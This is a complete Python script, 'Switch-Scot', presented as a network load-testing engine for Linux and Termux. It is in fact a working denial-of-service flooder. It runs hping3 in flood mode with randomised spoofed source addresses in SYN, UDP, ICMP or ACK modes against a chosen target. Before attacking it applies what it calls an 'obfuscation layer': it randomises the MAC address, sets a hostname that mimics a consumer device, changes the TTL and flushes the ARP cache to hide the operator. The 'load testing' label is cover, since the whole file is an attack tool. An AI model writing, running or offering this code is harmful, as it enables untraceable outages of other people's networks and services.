#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Switch-Scot ⚡
Universal Network Resilience & Load Testing Engine
Designed for Linux (Arch, Kali, Debian, Ubuntu) and Android (Termux)
"""

import os
import sys
import re
import random
import signal
import subprocess
import argparse
import time
from datetime import datetime

class SwitchScot:
    def __init__(self, target="10.0.0.1", port=80, interface=None, mode="tcp-syn"):
        self.target = target
        self.port = port
        self.mode = mode
        self.interface = interface or self.detect_interface()
        self.is_termux = self.check_termux()
        self.attack_process = None
        self.start_time = None
        self.current_mac = "N/A"
        self.current_hostname = "N/A"

    @staticmethod
    def check_termux():
        return "com.termux" in os.environ.get("PREFIX", "") or os.path.exists("/data/data/com.termux")

    def check_root(self):
        if os.geteuid() != 0:
            if self.is_termux:
                print("\n[!] Error: Root privileges required. Run with 'tsu'")
            else:
                print("\n[!] Error: Root privileges required. Run with 'sudo python3 switch_scot.py'")
            sys.exit(1)

    def check_dependencies(self):
        required_tools = ["hping3", "macchanger", "ip"]
        missing = []
        for tool in required_tools:
            if subprocess.run(["which", tool], capture_output=True).returncode != 0:
                missing.append(tool)
        
        if missing:
            print(f"\n[!] Missing required system tools: {', '.join(missing)}")
            if self.is_termux:
                print("[*] Install on Termux: pkg install root-repo && pkg install tsu hping3 macchanger iproute2")
            else:
                print("[*] Install on Debian/Kali: sudo apt install -y hping3 macchanger iproute2")
                print("[*] Install on Arch: sudo pacman -S --noconfirm hping macchanger iproute2")
            sys.exit(1)

    def detect_interface(self):
        try:
            out = subprocess.check_output(["ip", "route", "show", "default"], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"dev\s+([^\s]+)", out)
            if match:
                return match.group(1)
        except Exception:
            pass

        # Fallback: scan available interfaces
        try:
            ifaces = [f for f in os.listdir('/sys/class/net') if f != 'lo']
            if ifaces:
                return ifaces[0]
        except Exception:
            pass

        return "wlan0"

    def get_mac_address(self):
        try:
            out = subprocess.check_output(["ip", "link", "show", self.interface], stderr=subprocess.DEVNULL).decode()
            match = re.search(r"link/ether\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})", out)
            return match.group(1) if match else "Unknown"
        except Exception:
            return "Unknown"

    def randomize_identity(self):
        print("\n[*] Applying persistent obfuscation layer...")
        
        # 1. Randomize TTL (64 - 128)
        new_ttl = random.randint(64, 128)
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_default_ttl={new_ttl}"], capture_output=True)

        # 2. Randomize Device Hostname
        host_pool = [
            "iPhone-14-Pro", "iPad-Air", "Galaxy-S23", "Pixel-8-Pro", 
            "MacBook-Pro-M2", "Dell-XPS-15", "ThinkPad-X1", "Smart-TV-LG",
            "Workstation-X", "Ubuntu-Server", "Surface-Laptop"
        ]
        new_host = f"{random.choice(host_pool)}-{random.randint(100, 999)}"
        subprocess.run(["hostname", new_host], capture_output=True)
        self.current_hostname = new_host

        # 3. Randomize MAC Address
        subprocess.run(["ip", "link", "set", self.interface, "down"], capture_output=True)
        subprocess.run(["macchanger", "-r", self.interface], capture_output=True)
        subprocess.run(["ip", "link", "set", self.interface, "up"], capture_output=True)
        self.current_mac = self.get_mac_address()

        # 4. Flush ARP neighbor cache
        subprocess.run(["ip", "neigh", "flush", "all"], capture_output=True)
        time.sleep(1.5)

    def build_command(self):
        base_cmd = ["hping3", "--flood", "--rand-source"]
        
        if self.mode == "tcp-syn":
            return base_cmd + ["-p", str(self.port), "-S", self.target]
        elif self.mode == "udp":
            return base_cmd + ["--udp", "-p", str(self.port), self.target]
        elif self.mode == "icmp":
            return base_cmd + ["--icmp", self.target]
        elif self.mode == "tcp-ack":
            return base_cmd + ["-p", str(self.port), "-A", self.target]
        else:
            return base_cmd + ["-p", str(self.port), "-S", self.target]

    def start(self):
        self.check_root()
        self.check_dependencies()
        self.randomize_identity()

        cmd = self.build_command()
        print("=" * 60)
        print(f" ⚡ SWITCH-SCOT ENGINE ACTIVE")
        print(f" • Platform  : {'Android (Termux)' if self.is_termux else 'Linux OS'}")
        print(f" • Interface : {self.interface} | MAC: {self.current_mac}")
        print(f" • Hostname  : {self.current_hostname}")
        print(f" • Mode      : {self.mode.upper()} | Target: {self.target}:{self.port if self.mode != 'icmp' else 'ICMP'}")
        print("=" * 60)
        print(" [*] Press Ctrl+C to terminate execution.\n")

        self.start_time = datetime.now()
        try:
            self.attack_process = subprocess.Popen(
                cmd,
                preexec_fn=os.setsid,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            while True:
                elapsed = str(datetime.now() - self.start_time).split(".")[0]
                sys.stdout.write(f"\r >> [RUNNING] Target: {self.target} | Mode: {self.mode.upper()} | Elapsed: {elapsed} ")
                sys.stdout.flush()
                time.sleep(1)

        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        if self.attack_process:
            try:
                os.killpg(os.getpgid(self.attack_process.pid), signal.SIGKILL)
            except Exception:
                pass
        print("\n\n[+] Switch-Scot execution stopped.")
        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(
        description="Switch-Scot ⚡ Universal Cross-Platform Network Resilience & Load Testing Engine",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "-t", "--target",
        default="10.0.0.1",
        help="Target IP address (Default: 10.0.0.1)"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=80,
        help="Target Port (Default: 80)"
    )
    parser.add_argument(
        "-i", "--interface",
        default=None,
        help="Network interface to bind (Default: Auto-detected)"
    )
    parser.add_argument(
        "-m", "--mode",
        choices=["tcp-syn", "udp", "icmp", "tcp-ack"],
        default="tcp-syn",
        help="Evaluation Mode:\n"
             "  tcp-syn  : TCP SYN Connection Load (Default)\n"
             "  udp      : UDP Stateless Buffer Stress\n"
             "  icmp     : ICMP Echo Control Plane Latency\n"
             "  tcp-ack  : TCP ACK Stateful Filter Inspection"
    )

    args = parser.parse_args()
    engine = SwitchScot(
        target=args.target,
        port=args.port,
        interface=args.interface,
        mode=args.mode
    )
    engine.start()

if __name__ == "__main__":
    main()
